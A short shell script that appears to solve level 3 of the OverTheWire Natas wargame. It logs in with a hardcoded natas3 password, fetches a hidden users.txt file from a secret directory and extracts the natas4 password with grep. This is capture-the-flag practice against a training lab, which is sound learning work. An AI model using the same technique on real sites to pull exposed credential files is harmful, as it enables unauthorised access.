#!/bin/sh

RESPONSE=$(curl --silent \
                --user natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14 \
                http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt)
PASSWORD=$(echo ${RESPONSE} | grep -Po "(?<=natas4:)[A-Za-z0-9]{32}")
printf "The password for natas04 is: ${PASSWORD}\n"
